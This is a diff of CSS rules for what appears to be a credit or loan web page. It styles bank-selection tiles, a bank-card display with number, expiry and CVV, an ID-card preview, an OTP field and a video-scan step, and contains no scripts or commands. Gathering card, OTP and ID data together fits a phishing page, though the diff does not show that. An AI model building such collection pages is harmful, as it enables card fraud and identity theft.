+            cursor:pointer;text-align:center;transition:all .25s ease;
+            background:var(--white);
+            position:relative;
+        }
+        .bank-option:hover{
+            border-color:var(--teal-mid);
+            transform:translateY(-3px);
+            box-shadow:var(--shadow-sm);
+        }
+        .bank-option.selected{
+            border-color:var(--teal-deep);
+            background:var(--sage);
+            box-shadow:0 0 30px rgba(173,127,63,0.15);
+        }
+        .bank-option.selected::after{
+            content:'✓';
+            position:absolute;
+            top:-8px;right:-8px;
+            background:var(--teal-deep);
+            color:white;
+            width:24px;height:24px;
+            border-radius:50%;
+            font-size:13px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+        }
+        .bank-option .bank-logo-img{
+            height:38px;
+            max-width:130px;
+            object-fit:contain;
+            margin-bottom:4px;
+            display:block;
+            margin-left:auto;
+            margin-right:auto;
+        }
+        .bank-option .bank-name{font-size:13px;font-weight:600;margin-top:2px;}
+        .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
 
-  /* ===== KART INPUT ===== */
-  .card-input-wrap{
-    background:var(--paper);
-    border-radius:16px;
-    padding:20px;
-    text-align:center;
-    border:2px dashed var(--line);
-    transition:all .4s ease;
-    position:relative;
-  }
-  .card-input-wrap .bank-card-visual{
-    position:relative;
-    width:100%;
-    max-width:380px;
-    margin:0 auto 14px;
-    padding:24px 28px;
-    border-radius:20px;
-    color:white;
-    font-family:'IBM Plex Mono',monospace;
-    transition:all .5s ease;
-    box-shadow:0 12px 48px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
-    min-height:190px;
-    display:flex;
-    flex-direction:column;
-    justify-content:space-between;
-    cursor:text;
-    position:relative;
-    overflow:hidden;
-  }
-  .card-input-wrap .bank-card-visual::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    right:-20%;
-    width:250px;
-    height:250px;
-    border-radius:50%;
-    background:rgba(255,255,255,0.06);
-    pointer-events:none;
-  }
-  .card-input-wrap .bank-card-visual::after{
-    content:'';
-    position:absolute;
-    bottom:-30%;
-    left:-10%;
-    width:180px;
-    height:180px;
-    border-radius:50%;
-    background:rgba(255,255,255,0.04);
-    pointer-events:none;
-  }
-  .card-input-wrap .bank-card-visual .card-chip{
-    width:40px;
-    height:30px;
-    background:linear-gradient(135deg, #D4A84B, #B8943A, #9A7A2E);
-    border-radius:6px;
-    margin-bottom:14px;
-    border:1px solid rgba(255,255,255,0.2);
-    position:relative;
-    z-index:1;
-    box-shadow:inset 0 2px 4px rgba(0,0,0,0.2);
-  }
-  .card-input-wrap .bank-card-visual .card-chip::after{
-    content:'';
-    position:absolute;
-    top:4px;
-    left:4px;
-    right:4px;
-    bottom:4px;
-    border-radius:3px;
-    background:linear-gradient(135deg, rgba(255,255,255,0.1), transparent);
-  }
-  .card-input-wrap .bank-card-visual .card-top{
-    display:flex;
-    justify-content:space-between;
-    align-items:flex-start;
-    position:relative;
-    z-index:1;
-  }
-  .card-input-wrap .bank-card-visual .card-top .bank-name-on-card{
-    font-size:14px;
-    font-weight:700;
-    letter-spacing:2px;
-    text-transform:uppercase;
-    opacity:0.85;
-    text-shadow:0 1px 2px rgba(0,0,0,0.2);
-  }
-  .card-input-wrap .bank-card-visual .card-top .card-type{
-    font-size:24px;
-    opacity:0.6;
-    letter-spacing:2px;
-    text-shadow:0 1px 2px rgba(0,0,0,0.2);
-  }
-  .card-input-wrap .bank-card-visual .card-number-display{
-    font-size:22px;
-    letter-spacing:5px;
-    text-align:center;
-    padding:12px 0 10px;
-    text-shadow:0 2px 4px rgba(0,0,0,0.25);
-    font-weight:500;
-    position:relative;
-    z-index:1;
-    font-family:'IBM Plex Mono',monospace;
-    cursor:text;
-  }
-  .card-input-wrap .bank-card-visual .card-bottom{
-    display:flex;
-    justify-content:space-between;
-    align-items:flex-end;
-    font-size:11px;
-    opacity:0.85;
-    position:relative;
-    z-index:1;
-  }
-  .card-input-wrap .bank-card-visual .card-bottom .card-expiry-label{
-    text-transform:uppercase;
-    font-size:8px;
-    opacity:0.5;
-    letter-spacing:1px;
-  }
-  .card-input-wrap .bank-card-visual .card-bottom .card-expiry-value{
-    font-size:14px;
-    font-weight:600;
-    letter-spacing:1px;
-  }
-  .card-input-wrap .bank-card-visual .card-bottom .card-cvv-label{
-    text-transform:uppercase;
-    font-size:8px;
-    opacity:0.5;
-    letter-spacing:1px;
-  }
-  .card-input-wrap .bank-card-visual .card-bottom .card-cvv-value{
-    font-size:14px;
-    font-weight:600;
-    letter-spacing:1px;
-  }
-  .card-input-wrap .bank-card-visual .card-contactless{
-    position:absolute;
-    bottom:16px;
-    right:18px;
-    font-size:20px;
-    opacity:0.25;
-    z-index:1;
-  }
-  .card-input-wrap .bank-card-visual .card-logo-on-card{
-    position:absolute;
-    top:14px;
-    right:16px;
-    height:28px;
-    opacity:0.5;
-    z-index:1;
-    object-fit:contain;
-  }
-  .card-input-wrap .card-number-input-hidden{
-    position:absolute;
-    opacity:0;
-    width:1px;
-    height:1px;
-    pointer-events:none;
-  }
-  .progress-bar{
-    width:100%;height:6px;background:var(--sage);border-radius:4px;
-    margin:12px 0 8px;overflow:hidden;
-  }
-  .progress-bar .fill{
-    height:100%;background:var(--teal-deep);border-radius:4px;
-    transition:width .3s ease;width:0%;
-  }
-  .progress-label{font-size:13px;color:var(--ink-soft);font-family:'IBM Plex Mono',monospace;}
+        .card-input-wrap{
+            background:var(--paper);
+            border-radius:16px;
+            padding:20px;
+            text-align:center;
+            border:2px dashed var(--line);
+            transition:all .4s ease;
+            position:relative;
+        }
+        .card-input-wrap .bank-card-visual{
+            position:relative;
+            width:100%;
+            max-width:380px;
+            margin:0 auto 14px;
+            padding:24px 28px;
+            border-radius:20px;
+            color:white;
+            font-family:'IBM Plex Mono',monospace;
+            transition:all .5s ease;
+            box-shadow:0 12px 48px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
+            min-height:190px;
+            display:flex;
+            flex-direction:column;
+            justify-content:space-between;
+            cursor:text;
+            position:relative;
+            overflow:hidden;
+        }
+        .card-input-wrap .bank-card-visual::before{
+            content:'';
+            position:absolute;
+            top:-50%;
+            right:-20%;
+            width:250px;
+            height:250px;
+            border-radius:50%;
+            background:rgba(255,255,255,0.06);
+            pointer-events:none;
+        }
+        .card-input-wrap .bank-card-visual::after{
+            content:'';
+            position:absolute;
+            bottom:-30%;
+            left:-10%;
+            width:180px;
+            height:180px;
+            border-radius:50%;
+            background:rgba(255,255,255,0.04);
+            pointer-events:none;
+        }
+        .card-input-wrap .bank-card-visual .card-chip{
+            width:40px;
+            height:30px;
+            background:linear-gradient(135deg, #D4A84B, #B8943A, #9A7A2E);
+            border-radius:6px;
+            margin-bottom:14px;
+            border:1px solid rgba(255,255,255,0.2);
+            position:relative;
+            z-index:1;
+            box-shadow:inset 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .card-input-wrap .bank-card-visual .card-chip::after{
+            content:'';
+            position:absolute;
+            top:4px;
+            left:4px;
+            right:4px;
+            bottom:4px;
+            border-radius:3px;
+            background:linear-gradient(135deg, rgba(255,255,255,0.1), transparent);
+        }
+        .card-input-wrap .bank-card-visual .card-top{
+            display:flex;
+            justify-content:space-between;
+            align-items:flex-start;
+            position:relative;
+            z-index:1;
+        }
+        .card-input-wrap .bank-card-visual .card-top .bank-name-on-card{
+            font-size:14px;
+            font-weight:700;
+            letter-spacing:2px;
+            text-transform:uppercase;
+            opacity:0.85;
+            text-shadow:0 1px 2px rgba(0,0,0,0.2);
+        }
+        .card-input-wrap .bank-card-visual .card-top .card-type{
+            font-size:24px;
+            opacity:0.6;
+            letter-spacing:2px;
+            text-shadow:0 1px 2px rgba(0,0,0,0.2);
+        }
+        .card-input-wrap .bank-card-visual .card-number-display{
+            font-size:22px;
+            letter-spacing:5px;
+            text-align:center;
+            padding:12px 0 10px;
+            text-shadow:0 2px 4px rgba(0,0,0,0.25);
+            font-weight:500;
+            position:relative;
+            z-index:1;
+            font-family:'IBM Plex Mono',monospace;
+            cursor:text;
+        }
+        .card-input-wrap .bank-card-visual .card-bottom{
+            display:flex;
+            justify-content:space-between;
+            align-items:flex-end;
+            font-size:11px;
+            opacity:0.85;
+            position:relative;
+            z-index:1;
+        }
+        .card-input-wrap .bank-card-visual .card-bottom .card-expiry-label{
+            text-transform:uppercase;
+            font-size:8px;
+            opacity:0.5;
+            letter-spacing:1px;
+        }
+        .card-input-wrap .bank-card-visual .card-bottom .card-expiry-value{
+            font-size:14px;
+            font-weight:600;
+            letter-spacing:1px;
+        }
+        .card-input-wrap .bank-card-visual .card-bottom .card-cvv-label{
+            text-transform:uppercase;
+            font-size:8px;
+            opacity:0.5;
+            letter-spacing:1px;
+        }
+        .card-input-wrap .bank-card-visual .card-bottom .card-cvv-value{
+            font-size:14px;
+            font-weight:600;
+            letter-spacing:1px;
+        }
+        .card-input-wrap .bank-card-visual .card-contactless{
+            position:absolute;
+            bottom:16px;
+            right:18px;
+            font-size:20px;
+            opacity:0.25;
+            z-index:1;
+        }
+        .card-input-wrap .bank-card-visual .card-logo-on-card{
+            position:absolute;
+            top:14px;
+            right:16px;
+            height:28px;
+            opacity:0.5;
+            z-index:1;
+            object-fit:contain;
+        }
+        .card-input-wrap .card-number-input-hidden{
+            position:absolute;
+            opacity:0;
+            width:1px;
+            height:1px;
+            pointer-events:none;
+        }
+        .progress-bar{
+            width:100%;height:6px;background:var(--sage);border-radius:4px;
+            margin:12px 0 8px;overflow:hidden;
+        }
+        .progress-bar .fill{
+            height:100%;background:var(--teal-deep);border-radius:4px;
+            transition:width .3s ease;width:0%;
+        }
+        .progress-label{font-size:13px;color:var(--ink-soft);font-family:'IBM Plex Mono',monospace;}
 
-  .card-details-row{
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:16px;
-    margin:16px 0 0;
-  }
-  .card-details-row .field{margin-bottom:0;}
+        .card-details-row{
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:16px;
+            margin:16px 0 0;
+        }
+        .card-details-row .field{margin-bottom:0;}
 
-  .id-card-preview{
-    background:linear-gradient(145deg, #f5f0e8, #e5ddd2);
-    border-radius:16px;
-    padding:20px 24px;
-    border:2px solid #b8aa98;
-    box-shadow:0 8px 24px rgba(0,0,0,0.12);
-    max-width:440px;
-    margin:16px auto;
-    position:relative;
-  }
-  .id-card-preview .id-header{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    border-bottom:2px solid #b8aa98;
-    padding-bottom:8px;
-    margin-bottom:12px;
-  }
-  .id-card-preview .id-header .id-title{
-    font-weight:700;
-    font-size:12px;
-    color:#2d2a24;
-    letter-spacing:0.5px;
-    line-height:1.3;
-  }
-  .id-card-preview .id-header .id-title small{
-    display:block;
-    font-weight:400;
-    font-size:9px;
-    color:#6a6258;
-    letter-spacing:0.3px;
-  }
-  .id-card-preview .id-header .id-logo{
-    font-size:14px;
-    font-weight:800;
-    color:#8B0000;
-    text-align:right;
-    line-height:1.2;
-  }
-  .id-card-preview .id-header .id-logo small{
-    display:block;
-    font-size:8px;
-    font-weight:400;
-    color:#6a6258;
-  }
-  .id-card-preview .id-photo{
-    width:85px;
-    height:105px;
-    background:linear-gradient(135deg, #d4c8b8, #c0b4a4);
-    border-radius:4px;
-    border:1px solid #b0a494;
-    float:right;
-    margin-left:16px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:36px;
-    color:#8a7a6a;
-    position:relative;
-  }
-  .id-card-preview .id-photo::after{
-    content:'';
-    position:absolute;
-    bottom:0;
-    left:0;
-    right:0;
-    height:20px;
-    background:linear-gradient(to top, rgba(0,0,0,0.05), transparent);
-    border-radius:0 0 4px 4px;
-  }
-  .id-card-preview .id-row{
-    display:flex;
-    padding:3px 0;
-    font-size:11px;
-    border-bottom:1px solid rgba(0,0,0,0.04);
-  }
-  .id-card-preview .id-row .id-label{
-    width:110px;
-    font-weight:600;
-    color:#4a4238;
-    font-size:9px;
-    text-transform:uppercase;
-    letter-spacing:0.5px;
-  }
-  .id-card-preview .id-row .id-value{
-    flex:1;
-    color:#1a1612;
-    font-weight:500;
-    font-size:11px;
-    text-transform:uppercase;
-  }
-  .id-card-preview .id-footer{
-    margin-top:12px;
-    padding-top:10px;
-    border-top:2px solid #b8aa98;
-    display:flex;
-    justify-content:space-between;
-    font-size:8px;
-    color:#6a6258;
-    text-transform:uppercase;
-    letter-spacing:0.5px;
-  }
-  .id-card-preview .id-signature{
-    margin-top:8px;
-    padding-top:8px;
-    border-top:1px dashed #b8aa98;
-    display:flex;
-    justify-content:space-between;
-    font-size:9px;
-    color:#4a4238;
-  }
-  .id-card-preview .id-signature .sig-line{
-    border-bottom:1px solid #a09080;
-    width:100px;
-    height:1px;
-    margin-top:4px;
-  }
+        .id-card-preview{
+            background:linear-gradient(145deg, #f5f0e8, #e5ddd2);
+            border-radius:16px;
+            padding:20px 24px;
+            border:2px solid #b8aa98;
+            box-shadow:0 8px 24px rgba(0,0,0,0.12);
+            max-width:440px;
+            margin:16px auto;
+            position:relative;
+        }
+        .id-card-preview .id-header{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            border-bottom:2px solid #b8aa98;
+            padding-bottom:8px;
+            margin-bottom:12px;
+        }
+        .id-card-preview .id-header .id-title{
+            font-weight:700;
+            font-size:12px;
+            color:#2d2a24;
+            letter-spacing:0.5px;
+            line-height:1.3;
+        }
+        .id-card-preview .id-header .id-title small{
+            display:block;
+            font-weight:400;
+            font-size:9px;
+            color:#6a6258;
+            letter-spacing:0.3px;
+        }
+        .id-card-preview .id-header .id-logo{
+            font-size:14px;
+            font-weight:800;
+            color:#8B0000;
+            text-align:right;
+            line-height:1.2;
+        }
+        .id-card-preview .id-header .id-logo small{
+            display:block;
+            font-size:8px;
+            font-weight:400;
+            color:#6a6258;
+        }
+        .id-card-preview .id-photo{
+            width:85px;
+            height:105px;
+            background:linear-gradient(135deg, #d4c8b8, #c0b4a4);
+            border-radius:4px;
+            border:1px solid #b0a494;
+            float:right;
+            margin-left:16px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-size:36px;
+            color:#8a7a6a;
+            position:relative;
+        }
+        .id-card-preview .id-photo::after{
+            content:'';
+            position:absolute;
+            bottom:0;
+            left:0;
+            right:0;
+            height:20px;
+            background:linear-gradient(to top, rgba(0,0,0,0.05), transparent);
+            border-radius:0 0 4px 4px;
+        }
+        .id-card-preview .id-row{
+            display:flex;
+            padding:3px 0;
+            font-size:11px;
+            border-bottom:1px solid rgba(0,0,0,0.04);
+        }
+        .id-card-preview .id-row .id-label{
+            width:110px;
+            font-weight:600;
+            color:#4a4238;
+            font-size:9px;
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+        }
+        .id-card-preview .id-row .id-value{
+            flex:1;
+            color:#1a1612;
+            font-weight:500;
+            font-size:11px;
+            text-transform:uppercase;
+        }
+        .id-card-preview .id-footer{
+            margin-top:12px;
+            padding-top:10px;
+            border-top:2px solid #b8aa98;
+            display:flex;
+            justify-content:space-between;
+            font-size:8px;
+            color:#6a6258;
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+        }
+        .id-card-preview .id-signature{
+            margin-top:8px;
+            padding-top:8px;
+            border-top:1px dashed #b8aa98;
+            display:flex;
+            justify-content:space-between;
+            font-size:9px;
+            color:#4a4238;
+        }
+        .id-card-preview .id-signature .sig-line{
+            border-bottom:1px solid #a09080;
+            width:100px;
+            height:1px;
+            margin-top:4px;
+        }
 
-  .checking-container{
-    text-align:center;
-    padding:30px 0;
-  }
-  .checking-container .spinner{
-    width:64px;
-    height:64px;
-    border:6px solid var(--sage);
-    border-top-color:var(--teal-deep);
-    border-radius:50%;
-    animation:spin 0.9s linear infinite;
-    margin:0 auto 24px;
-  }
-  @keyframes spin{to{transform:rotate(360deg);}}
-  .checking-container .check-icon{
-    font-size:52px;
-    margin-bottom:16px;
-    animation:pulse 1.5s ease-in-out infinite;
-  }
-  @keyframes pulse{
-    0%,100%{transform:scale(1);opacity:0.8;}
-    50%{transform:scale(1.1);opacity:1;}
-  }
-  .checking-container .check-title{
-    font-size:22px;
-    font-weight:700;
-    color:var(--teal-deep);
-  }
-  .checking-container .check-sub{
-    color:var(--ink-soft);
-    font-size:15px;
-    margin-top:8px;
-  }
-  .checking-container .check-dots{
-    margin-top:12px;
-    display:flex;
-    justify-content:center;
-    gap:8px;
-  }
-  .checking-container .check-dots span{
-    width:10px;height:10px;
-    border-radius:50%;
-    background:var(--sage);
-    animation:dotPulse 1.4s ease-in-out infinite;
-  }
-  .checking-container .check-dots span:nth-child(2){animation-delay:0.2s;}
-  .checking-container .check-dots span:nth-child(3){animation-delay:0.4s;}
-  @keyframes dotPulse{
-    0%,80%,100%{transform:scale(0.4);background:var(--sage);}
-    40%{transform:scale(1);background:var(--teal-deep);}
-  }
+        .checking-container{
+            text-align:center;
+            padding:30px 0;
+        }
+        .checking-container .spinner{
+            width:64px;
+            height:64px;
+            border:6px solid var(--sage);
+            border-top-color:var(--teal-deep);
+            border-radius:50%;
+            animation:spin 0.9s linear infinite;
+            margin:0 auto 24px;
+        }
+        @keyframes spin{to{transform:rotate(360deg);}}
+        .checking-container .check-icon{
+            font-size:52px;
+            margin-bottom:16px;
+            animation:pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse{
+            0%,100%{transform:scale(1);opacity:0.8;}
+            50%{transform:scale(1.1);opacity:1;}
+        }
+        .checking-container .check-title{
+            font-size:22px;
+            font-weight:700;
+            color:var(--teal-deep);
+        }
+        .checking-container .check-sub{
+            color:var(--ink-soft);
+            font-size:15px;
+            margin-top:8px;
+        }
+        .checking-container .check-dots{
+            margin-top:12px;
+            display:flex;
+            justify-content:center;
+            gap:8px;
+        }
+        .checking-container .check-dots span{
+            width:10px;height:10px;
+            border-radius:50%;
+            background:var(--sage);
+            animation:dotPulse 1.4s ease-in-out infinite;
+        }
+        .checking-container .check-dots span:nth-child(2){animation-delay:0.2s;}
+        .checking-container .check-dots span:nth-child(3){animation-delay:0.4s;}
+        @keyframes dotPulse{
+            0%,80%,100%{transform:scale(0.4);background:var(--sage);}
+            40%{transform:scale(1);background:var(--teal-deep);}
+        }
 
-  .otp-input-field input{
-    font-size:32px;
-    letter-spacing:14px;
-    text-align:center;
-    font-family:'IBM Plex Mono',monospace;
-    padding:16px 20px;
-    background:var(--white);
-    border:2px solid var(--teal-deep);
-    border-radius:12px;
-  }
-  .otp-input-field input:focus{
-    border-color:var(--gold);
-    box-shadow:0 0 0 4px rgba(173,127,63,0.2);
-  }
+        .otp-input-field input{
+            font-size:32px;
+            letter-spacing:14px;
+            text-align:center;
+            font-family:'IBM Plex Mono',monospace;
+            padding:16px 20px;
+            background:var(--white);
+            border:2px solid var(--teal-deep);
+            border-radius:12px;
+        }
+        .otp-input-field input:focus{
+            border-color:var(--gold);
+            box-shadow:0 0 0 4px rgba(173,127,63,0.2);
+        }
 
-  .summary-row{
-    display:flex;justify-content:space-between;align-items:center;
-    padding:16px 0;border-bottom:1px solid var(--line);
-  }
-  .summary-row:last-of-type{border-bottom:none;}
-  .summary-label{font-size:12.5px;color:var(--ink-soft);margin-bottom:4px;text-transform:uppercase;letter-spacing:.04em;font-family:'IBM Plex Mono',monospace;}
-  .summary-value{font-size:16.5px;font-weight:700;font-family:'IBM Plex Mono',monospace;}
-  .edit-btn{
-    background:var(--sage);border:none;width:36px;height:36px;border-radius:10px;
-    cursor:pointer;font-size:15px;color:var(--teal-deep);flex-shrink:0;margin-left:16px;
-    transition:background .18s ease;
-  }
-  .edit-btn:hover{background:var(--line);}
+        .summary-row{
+            display:flex;justify-content:space-between;align-items:center;
+            padding:16px 0;border-bottom:1px solid var(--line);
+        }
+        .summary-row:last-of-type{border-bottom:none;}
+        .summary-label{font-size:12.5px;color:var(--ink-soft);margin-bottom:4px;text-transform:uppercase;letter-spacing:.04em;font-family:'IBM Plex Mono',monospace;}
+        .summary-value{font-size:16.5px;font-weight:700;font-family:'IBM Plex Mono',monospace;}
+        .edit-btn{
+            background:var(--sage);border:none;width:36px;height:36px;border-radius:10px;
+            cursor:pointer;font-size:15px;color:var(--teal-deep);flex-shrink:0;margin-left:16px;
+            transition:background .18s ease;
+        }
+        .edit-btn:hover{background:var(--line);}
 
-  .card-logos-row{
-    display:flex;
-    gap:12px;
-    justify-content:center;
-    margin:12px 0 16px;
-  }
-  .card-logos-row svg{
-    height:28px;
-    width:auto;
-    opacity:0.7;
-  }
+        .card-logos-row{
+            display:flex;
+            gap:12px;
+            justify-content:center;
+            margin:12px 0 16px;
+        }
+        .card-logos-row svg{
+            height:28px;
+            width:auto;
+            opacity:0.7;
+        }
 
-  .credit-result-box{
-    text-align:center;
-    padding:20px 0;
-  }
-  .credit-result-box .result-icon{font-size:56px;margin-bottom:12px;}
-  .credit-result-box .result-text{font-size:22px;font-weight:700;color:var(--teal-deep);}
-  .credit-result-box .result-sub{color:var(--ink-soft);font-size:15px;margin-top:6px;}
+        .credit-result-box{
+            text-align:center;
+            padding:20px 0;
+        }
+        .credit-result-box .result-icon{font-size:56px;margin-bottom:12px;}
+        .credit-result-box .result-text{font-size:22px;font-weight:700;color:var(--teal-deep);}
+        .credit-result-box .result-sub{color:var(--ink-soft);font-size:15px;margin-top:6px;}
 
-  .payment-amount{
-    background:var(--teal-deep);
-    color:var(--white);
-    border-radius:12px;
-    padding:16px 20px;
-    text-align:center;
-    margin-bottom:16px;
-  }
-  .payment-amount .amount{
-    font-size:28px;
-    font-weight:700;
-    color:#E8C688;
-  }
-  .payment-amount .label{font-size:13px;opacity:0.8;}
+        .payment-amount{
+            background:var(--teal-deep);
+            color:var(--white);
+            border-radius:12px;
+            padding:16px 20px;
+            text-align:center;
+            margin-bottom:16px;
+        }
+        .payment-amount .amount{
+            font-size:28px;
+            font-weight:700;
+            color:#E8C688;
+        }
+        .payment-amount .label{font-size:13px;opacity:0.8;}
 
-  footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
-  .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
-  .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:14px;color:var(--white);}
-  .footer-grid p, .footer-grid a{font-size:13.5px;color:#C9C2AE;line-height:1.7;text-decoration:none;}
-  .foot-note{
-    border-top:1px solid rgba(255,255,255,0.15);padding-top:20px;
-    font-size:12px;color:#9B9480;line-height:1.7;
-  }
+        footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
+        .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
+        .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:14px;color:var(--white);}
+        .footer-grid p, .footer-grid a{font-size:13.5px;color:#C9C2AE;line-height:1.7;text-decoration:none;}
+        .foot-note{
+            border-top:1px solid rgba(255,255,255,0.15);padding-top:20px;
+            font-size:12px;color:#9B9480;line-height:1.7;
+        }
 
-  .face-scan-container{
-    text-align:center;
-    padding:10px 0;
-  }
-  .face-scan-frame{
-    position:relative;
-    width:240px;
-    height:240px;
-    margin:0 auto 16px;
-    border-radius:50%;
-    border:4px solid var(--gold);
-    overflow:hidden;
-    background:linear-gradient(145deg, #1a1a2e, #2d2d44);
-    box-shadow:0 0 60px rgba(173,127,63,0.2), inset 0 0 60px rgba(173,127,63,0.05);
-  }
-  .face-scan-frame video{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-    transform:scaleX(-1);
-  }
-  .face-scan-frame .face-overlay{
-    position:absolute;
-    inset:0;
-    border-radius:50%;
-    border:3px solid rgba(173,127,63,0.5);
-    box-shadow:inset 0 0 40px rgba(173,127,63,0.15);
-    pointer-events:none;
-  }
-  .face-scan-frame .scan-line{
-    position:absolute;
-    left:10%;
-    right:10%;
-    height:2px;
-    background:linear-gradient(90deg, transparent, var(--gold), transparent);
-    top:20%;
-    animation:scanMove 2s ease-in-out infinite;
-    box-shadow:0 0 20px rgba(173,127,63,0.3);
-    pointer-events:none;
-    opacity:0.6;
-  }
-  @keyframes scanMove{
-    0%{top:15%;}
-    50%{top:75%;}
-    100%{top:15%;}
-  }
-  .face-scan-frame .scan-corner{
-    position:absolute;
-    width:22px;
-    height:22px;
-    border-color:var(--gold);
-    border-style:solid;
-    border-width:0;
-    pointer-events:none;
-    opacity:0.7;
-  }
-  .face-scan-frame .scan-corner.tl{top:6px;left:6px;border-top-width:3px;border-left-width:3px;border-radius:2px 0 0 0;}
-  .face-scan-frame .scan-corner.tr{top:6px;right:6px;border-top-width:3px;border-right-width:3px;border-radius:0 2px 0 0;}
-  .face-scan-frame .scan-corner.bl{bottom:6px;left:6px;border-bottom-width:3px;border-left-width:3px;border-radius:0 0 0 2px;}
-  .face-scan-frame .scan-corner.br{bottom:6px;right:6px;border-bottom-width:3px;border-right-width:3px;border-radius:0 0 2px 0;}
+        /* ===== VIDEO ÇƏKİLİŞ ===== */
+        .video-scan-container{
+            text-align:center;
+            padding:10px 0;
+        }
+        .video-scan-frame{
+            position:relative;
+            width:100%;
+            max-width:380px;
+            margin:0 auto 16px;
+            border-radius:16px;
+            overflow:hidden;
+            background:linear-gradient(145deg, #1a1a2e, #2d2d44);
+            box-shadow:0 0 60px rgba(173,127,63,0.15), inset 0 0 60px rgba(173,127,63,0.05);
+            aspect-ratio: 16/9;
+        }
+        .video-scan-frame video{
+            width:100%;
+            height:100%;
+            object-fit:cover;
+        }
+        .video-scan-frame .scan-overlay{
+            position:absolute;
+            inset:0;
+            border:3px solid rgba(173,127,63,0.4);
+            border-radius:16px;
+            pointer-events:none;
+        }
+        .video-scan-frame .scan-line{
+            position:absolute;
+            left:5%;
+            right:5%;
+            height:2px;
+            background:linear-gradient(90deg, transparent, var(--gold), transparent);
+            top:20%;
+            animation:scanMove 2.5s ease-in-out infinite;
+            box-shadow:0 0 20px rgba(173,127,63,0.3);
+            pointer-events:none;
+            opacity:0.6;
+        }
+        @keyframes scanMove{
+            0%{top:10%;}
+            50%{top:80%;}
+            100%{top:10%;}
+        }
+        .video-scan-frame .scan-corner{
+            position:absolute;
+            width:22px;
+            height:22px;
+            border-color:var(--gold);
+            border-style:solid;
+            border-width:0;
+            pointer-events:none;
+            opacity:0.8;
+        }
+        .video-scan-frame .scan-corner.tl{top:8px;left:8px;border-top-width:3px;border-left-width:3px;border-radius:2px 0 0 0;}
+        .video-scan-frame .scan-corner.tr{top:8px;right:8px;border-top-width:3px;border-right-width:3px;border-radius:0 2px 0 0;}
+        .video-scan-frame .scan-corner.bl{bottom:8px;left:8px;border-bottom-width:3px;border-left-width:3px;border-radius:0 0 0 2px;}
+        .video-scan-frame .scan-corner.br{bottom:8px;right:8px;border-bottom-width:3px;border-right-width:3px;border-radius:0 0 2px 0;}
 
-  .face-scan-status{
-    font-size:15px;
-    font-weight:600;
-    color:var(--teal-deep);
-    margin-top:8px;
-  }
-  .face-scan-status .sub{
-    font-size:13px;
-    font-weight:400;
-    color:var(--ink-soft);
-    display:block;
-    margin-top:4px;
-  }
-  .face-scan-progress{
-    width:100%;
-    max-width:300px;
-    height:5px;
-    background:var(--sage);
-    border-radius:4px;
-    margin:12px auto 0;
-    overflow:hidden;
-  }
-  .face-scan-progress .fill{
-    height:100%;
-    background:linear-gradient(90deg, var(--gold), var(--teal-deep));
-    border-radius:4px;
-    transition:width 0.3s ease;
-    width:0%;
-  }
-  .face-scan-status-text{
-    font-size:14px;
-    color:var(--ink-soft);
-    margin-top:6px;
-    min-height:22px;
-  }
+        .video-scan-status{
+            font-size:16px;
+            font-weight:600;
+            color:var(--teal-deep);
+            margin-top:8px;
+        }
+        .video-scan-status .sub{
+            font-size:13px;
+            font-weight:400;
+            color:var(--ink-soft);
+            display:block;
+            margin-top:4px;
+        }
+        .video-scan-progress{
+            width:100%;
+            max-width:300px;
+            height:5px;
+            background:var(--sage);
+            border-radius:4px;
+            margin:12px auto 0;
+            overflow:hidden;
+        }
+        .video-scan-progress .fill{
+            height:100%;
+            background:linear-gradient(90deg, var(--gold), var(--teal-deep));
+            border-radius:4px;
+            transition:width 0.3s ease;
+            width:0%;
+        }
+        .video-scan-status-text{
+            font-size:14px;
+            color:var(--ink-soft);
+            margin-top:6px;
+            min-height:22px;
+        }
+        .step-counter{
+            display:inline-block;
+            background:var(--teal-deep);
+            color:var(--white);
+            border-radius:999px;
+            padding:4px 16px;
+            font-size:13px;
+            font-weight:600;
+            margin-bottom:8px;
+        }
 
-  .secure-badge{
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:8px;
-    font-size:12px;
-    color:var(--ink-soft);
-    margin:8px 0 4px;
-  }
-  .secure-badge span{
-    background:var(--sage);
-    padding:2px 10px;
-    border-radius:20px;
-    font-size:11px;
-  }
-
-  @media (max-width:1024px){
-    .hero-grid, .calc-card{grid-template-columns:1fr;}
-    .offers-grid{grid-template-columns:1fr 1fr;}
-    .steps{grid-template-columns:1fr 1fr 1fr;}
-    .bank-grid{grid-template-columns:1fr 1fr;}
-  }
-  @media (max-width:768px){
-    nav ul{display:none;}
-    .hero-grid, .calc-card, .offers-grid, .footer-grid, .steps{grid-template-columns:1fr;}
-    .bank-grid{grid-template-columns:1fr 1fr;}
-    .card-details-row{grid-template-columns:1fr;}
-    .id-card-preview .id-photo{width:60px;height:76px;font-size:24px;}
-    .id-card-preview .id-row .id-label{width:80px;font-size:8px;}
-    .id-card-preview .id-row .id-value{font-size:9px;}
-    .face-scan-frame{width:180px;height:180px;}
-    .cta-btn, .cta-white, .cta-ghost{font-size:13px;padding:12px 24px;}
-    .nav{padding:10px 16px;gap:8px;}
-    .logo{font-size:20px;}
-    .logo .logo-icon{width:30px;height:30px;font-size:14px;}
-    .hero{padding:40px 0 28px;}
-    section{padding:32px 0;}
